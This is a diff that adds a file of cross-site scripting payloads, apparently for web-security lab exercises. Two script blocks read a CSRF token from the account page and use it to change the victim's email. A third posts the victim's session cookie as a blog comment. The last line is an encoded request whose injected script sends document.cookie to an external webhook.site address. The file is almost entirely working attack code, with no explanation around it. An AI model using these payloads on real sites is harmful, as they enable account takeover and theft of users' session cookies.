@@ -1,0 +1,41 @@
+<script>fetch('/my-account').then(response=>{response.text()}).then(str=>{
+    str= str.split('name="csrf" value="')[1].split('"')[0];
+   const formData  = new FormData(); 
+formData.append('email','admin%40ic.co');
+formData.append('csrf',str);
+ fetch('/my-account/change-email', {method: 'POST', headers: {
+    'Content-Type': 'application/x-www-form-urlencoded'
+  },
+body:formData})
+});
+</script>
+
+<script>
+
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+  let token= this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+  var body = 'email=' + encodeURIComponent('admwerwfrefrefdfdgdtggtin@mail.ru') +
+  '&csrf='+token
+  var xhr = new XMLHttpRequest();
+    xhr.open("POST", '/my-account/change-email', true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.send(body);
+};
+</script>
+
+<script>
+
+var generatedSource = new XMLSerializer().serializeToString(document);
+      let token= generatedSource.match(/name="csrf" value="(\w+)"/)[1];
+      var body = 'csrf='+token+'&postId=9&name=wfwref&email=admi%40rfe.ef&website=https%3A%2F%2Fgoogle.com&comment='+document.cookie.split('=')[1]
+      var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/post/comment', true);
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.send(body);
+
+    </script>
+csrf=S1aKA0HOR7OrJ5MkdDrqWZDDLi1qWtCK&postId=9&comment=%3Cscript%3E%0D%0A%0D%0A++var+xhr+%3D+new+XMLHttpRequest%28%29%3B%0D%0A++++xhr.open%28%22GET%22%2C+%27https%3A%2F%2Fwebhook.site%2F0be9b412-8839-4de0-9982-12702140d6f0%3Fcookie%3D%27%2Bdocument.cookie%2C+true%29%3B%0D%0A++++xhr.send%28%29%3B%0D%0A%0D%0A%3C%2Fscript%3E&name=wfwref&email=admi%40rfe.ef&website=https%3A%2F%2Fgoogle.com
